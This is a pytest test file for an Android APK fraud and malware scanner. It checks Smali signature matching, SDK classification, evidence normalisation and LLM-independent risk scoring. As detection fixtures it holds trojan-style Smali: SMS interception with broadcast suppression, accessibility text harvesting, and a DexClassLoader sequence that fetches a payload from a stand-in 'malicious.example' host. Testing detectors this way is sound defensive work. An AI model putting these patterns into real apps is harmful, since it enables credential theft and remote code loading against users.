from __future__ import annotations

from pathlib import Path


from fraudshield.core.config import Settings
from fraudshield.deceptiscope.investigation import (
    AIInvestigatorClient,
    EvidenceItem,
    EvidenceNormalizer,
)
from fraudshield.deceptiscope.reverse import (
    APKDisassembler,
    CodeOwnership,
    DisassembledMethod,
    DisassemblyResult,
    SDKClassifier,
    SmaliScanner,
    extract_bounded_context,
)
from fraudshield.deceptiscope.scoring import RiskScorer


# ---------------------------------------------------------------------------
# Test 1: Behavioural signatures match expected Smali snippets
# ---------------------------------------------------------------------------
def test_signatures_match_expected_smali_snippets() -> None:
    scanner = SmaliScanner()

    # 1. SMS PDU & abortBroadcast
    sms_smali = """
    .method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
        invoke-static {p2}, Landroid/provider/Telephony$Sms$Intents;->getMessagesFromIntent(Landroid/content/Intent;)[Landroid/telephony/SmsMessage;
        move-result-object v0
        invoke-virtual {p0}, Lcom/fakebank/receiver/SmsReceiver;->abortBroadcast()V
        return-void
    .end method
    """
    sms_matches = scanner.scan_smali_text(
        sms_smali,
        class_name="Lcom/fakebank/receiver/SmsReceiver;",
        method_name="onReceive",
    )
    sig_ids = {m.signature_id for m in sms_matches}
    assert "MTH-SMS-001" in sig_ids  # SMS PDU Parsing
    assert "MTH-SMS-003" in sig_ids  # SMS Broadcast Suppression

    # 2. Accessibility Node Traversal & Keystroke injection
    acc_smali = """
    .method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
        invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;
        move-result-object v1
        const/16 v2, 0x10
        invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
        return-void
    .end method
    """
    acc_matches = scanner.scan_smali_text(
        acc_smali,
        class_name="Lcom/fakebank/service/MalService;",
        method_name="onAccessibilityEvent",
    )
    acc_sig_ids = {m.signature_id for m in acc_matches}
    assert "MTH-ACC-001" in acc_sig_ids  # Text Harvesting
    assert "MTH-ACC-002" in acc_sig_ids  # Input Automation

    # 3. Dynamic Code Loading
    dcl_smali = """
    .method public loadPayload(Ljava/lang/String;)V
        new-instance v0, Ldalvik/system/DexClassLoader;
        invoke-direct {v0, p1, v1, v2, v3}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
        return-void
    .end method
    """
    dcl_matches = scanner.scan_smali_text(
        dcl_smali,
        class_name="Lcom/fakebank/loader/Dropper;",
        method_name="loadPayload",
    )
    assert any(m.signature_id == "MTH-DCL-001" for m in dcl_matches)


# ---------------------------------------------------------------------------
# Test 2: Unrelated benign code does not create false matches
# ---------------------------------------------------------------------------
def test_unrelated_code_no_false_matches() -> None:
    scanner = SmaliScanner()
    clean_smali = """
    .method public calculateTax(DD)D
        add-double v0, p1, p3
        const-wide/high16 v2, 0x3ff0000000000000L
        mul-double/2addr v0, v2
        return-wide v0
    .end method
    """
    matches = scanner.scan_smali_text(
        clean_smali,
        class_name="Lcom/boi/calculator/TaxHelper;",
        method_name="calculateTax",
    )
    assert len(matches) == 0


# ---------------------------------------------------------------------------
# Test 3: Class/method context and bounded window extraction
# ---------------------------------------------------------------------------
def test_method_context_extraction() -> None:
    instructions = [
        "const-string v0, 'http://malicious.example/payload.dex'",
        "invoke-static {v0}, Lcom/fakebank/Net;->download(Ljava/lang/String;)Ljava/io/File;",
        "move-result-object v1",
        "new-instance v2, Ldalvik/system/DexClassLoader;",
        "invoke-direct {v2, v1, v3, v4, v5}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V",
        "const-string v6, 'com.fakebank.Payload'",
        "invoke-virtual {v2, v6}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;",
        "return-void",
    ]

    call_site, context = extract_bounded_context(instructions, match_index=4, before=2, after=2)
    assert "DexClassLoader;-><init>" in call_site
    assert "> invoke-direct {v2, v1, v3, v4, v5}, Ldalvik/system/DexClassLoader;-><init>" in context
    assert "move-result-object v1" in context
    assert "loadClass" in context


# ---------------------------------------------------------------------------
# Test 4: Stable evidence IDs generated without duplicates
# ---------------------------------------------------------------------------
def test_stable_evidence_ids() -> None:
    normalizer = EvidenceNormalizer(limit=50)
    findings = {
        "extraction": {
            "app": {"package_name": "com.boi.testapp", "app_label": "TestApp"},
            "file": {"sha256": "abcdef0123456789"},
            "permissions": {"requested": ["android.permission.READ_SMS"], "flagged_dangerous": ["android.permission.READ_SMS"]},
            "method_level_evidence": {
                "matches": [
                    {
                        "signature_id": "MTH-SMS-001",
                        "signature_title": "SMS PDU Parsing",
                        "class_name": "com.boi.testapp.SmsReceiver",
                        "method_name": "onReceive",
                        "matched_pattern": "SmsMessage;->createFromPdu",
                        "call_site": "invoke-static {p2}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;",
                        "code_context": "> invoke-static {p2}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;",
                        "code_ownership": "APPLICATION_CODE",
                        "category": "SMS_CREDENTIAL_THEFT",
                        "severity": "CRITICAL",
                        "dex_source": "classes.dex",
                    }
                ]
            },
        }
    }
    evidence = normalizer.build(findings)
    assert len(evidence) >= 4
    ids = [e.evidence_id for e in evidence]
    assert len(ids) == len(set(ids))
    assert ids[0] == "E001"
    assert ids[1] == "E002"

    method_ev = next(e for e in evidence if e.evidence_type == "method_behavior")
    assert method_ev.class_name == "com.boi.testapp.SmsReceiver"
    assert method_ev.method_name == "onReceive"
    assert method_ev.code_ownership == "APPLICATION_CODE"
    assert method_ev.trust_level == "STATIC_MATCH"
    assert method_ev.phase == "STATIC"


# ---------------------------------------------------------------------------
# Test 5: SDK Classifier distinguishes Application Code vs Known SDK vs System Library
# ---------------------------------------------------------------------------
def test_sdk_classifier_distinctions() -> None:
    classifier = SDKClassifier()
    app_pkg = "com.boi.mobilebanking"

    # Application Code
    own1, label1, sdk1 = classifier.classify("com.boi.mobilebanking.MainActivity", app_package=app_pkg)
    assert own1 == CodeOwnership.APPLICATION_CODE
    assert sdk1 is None

    # Known Analytics SDK (Adjust)
    own2, label2, sdk2 = classifier.classify("com.adjust.sdk.AdjustInstance", app_package=app_pkg)
    assert own2 == CodeOwnership.KNOWN_SDK
    assert sdk2 == "Adjust"

    # Known Social/Analytics SDK (Facebook)
    own3, label3, sdk3 = classifier.classify("com.facebook.appevents.AppEventsLogger", app_package=app_pkg)
    assert own3 == CodeOwnership.KNOWN_SDK
    assert sdk3 == "Facebook Analytics"

    # System Library
    own4, label4, sdk4 = classifier.classify("android.telephony.SmsManager", app_package=app_pkg)
    assert own4 == CodeOwnership.SYSTEM_LIBRARY


# ---------------------------------------------------------------------------
# Test 6: Missing APK / invalid file does not crash disassembler
# ---------------------------------------------------------------------------
def test_disassembler_missing_file_graceful_degradation() -> None:
    disassembler = APKDisassembler()
    result = disassembler.disassemble(Path("non_existent_file.apk"))
    assert result.status == "unavailable"
    assert len(result.methods) == 0
    assert len(result.warnings) > 0


# ---------------------------------------------------------------------------
# Test 7: Multi-DEX scanning simulation
# ---------------------------------------------------------------------------
def test_multidex_scanning() -> None:
    scanner = SmaliScanner()
    method1 = DisassembledMethod(
        class_name="Lcom/app/FirstClass;",
        method_name="run",
        descriptor="()V",
        source_file="FirstClass.java",
        dex_source="classes.dex",
        instructions=["invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z"],
    )
    method2 = DisassembledMethod(
        class_name="Lcom/app/SecondClass;",
        method_name="execute",
        descriptor="()V",
        source_file="SecondClass.java",
        dex_source="classes2.dex",
        instructions=["invoke-static {p0}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;"],
    )

    disassembly = DisassemblyResult(
        status="completed",
        tool_used="mock-multidex",
        dex_count=2,
        methods=[method1, method2],
        warnings=[],
    )
    matches = scanner.scan_disassembly(disassembly, app_package="com.app")
    assert len(matches) == 1
    assert matches[0].signature_id == "MTH-EVA-001"
    assert matches[0].dex_source == "classes.dex"


# ---------------------------------------------------------------------------
# Test 8: Old static-only workflow remains fully compatible
# ---------------------------------------------------------------------------
def test_static_only_backwards_compatibility() -> None:
    normalizer = EvidenceNormalizer()
    legacy_findings = {
        "extraction": {
            "app": {"package_name": "com.legacy.app"},
            "permissions": {"requested": ["android.permission.INTERNET"]},
        }
    }
    evidence = normalizer.build(legacy_findings)
    assert len(evidence) >= 2
    assert all(isinstance(e, EvidenceItem) for e in evidence)


# ---------------------------------------------------------------------------
# Test 9: AI Investigator receives normalized method-level evidence
# ---------------------------------------------------------------------------
def test_ai_investigator_receives_method_evidence() -> None:
    settings = Settings(llm_provider="disabled")
    investigator = AIInvestigatorClient(settings)

    findings = {
        "analysis_id": "test-analysis-001",
        "extraction": {
            "app": {"package_name": "com.fake.trojan"},
            "method_level_evidence": {
                "matches": [
                    {
                        "signature_id": "MTH-SMS-001",
                        "signature_title": "SMS PDU Parsing",
                        "class_name": "com.fake.trojan.SmsReceiver",
                        "method_name": "onReceive",
                        "matched_pattern": "SmsMessage;->createFromPdu",
                        "call_site": "invoke-static {p2}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;",
                        "code_context": "> invoke-static {p2}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;",
                        "code_ownership": "APPLICATION_CODE",
                        "category": "SMS_CREDENTIAL_THEFT",
                        "severity": "CRITICAL",
                    }
                ]
            },
        },
        "risk": {"overall_score": 65, "severity": "HIGH", "confidence": 0.85, "model_version": "apk-risk-2026.5"},
    }

    evidence = investigator.normalizer.build(findings)
    method_item = next(e for e in evidence if e.evidence_type == "method_behavior")
    assert method_item.class_name == "com.fake.trojan.SmsReceiver"
    assert method_item.call_site is not None
    assert method_item.code_context is not None


# ---------------------------------------------------------------------------
# Test 10: Scoring remains deterministic and independent of LLM output
# ---------------------------------------------------------------------------
def test_scoring_independent_of_llm() -> None:
    scorer = RiskScorer()
    extraction = {
        "permissions": {
            "requested": ["android.permission.READ_SMS", "android.permission.RECEIVE_SMS"],
            "flagged_dangerous": ["android.permission.READ_SMS", "android.permission.RECEIVE_SMS"],
        },
        "components": {"sms_receiver": True},
        "code_signals": {"sms_api": {"detected": True, "evidence": ["SmsManager"]}},
        "certificate": {"trust_evaluation": "UNKNOWN_CA"},
    }
    fraud_delta = {"score": 7.0}

    # Score before AI
    risk1 = scorer.calculate(extraction, fraud_delta)
    # Score with arbitrary non-authoritative LLM text injected
    extraction["llm_narrative"] = "This is a very high risk trojan with score 99"
    risk2 = scorer.calculate(extraction, fraud_delta)

    assert risk1["overall_score"] == risk2["overall_score"]
    assert risk1["static_score"] == risk2["static_score"]
    assert risk1["runtime_adjustment"] == risk2["runtime_adjustment"]
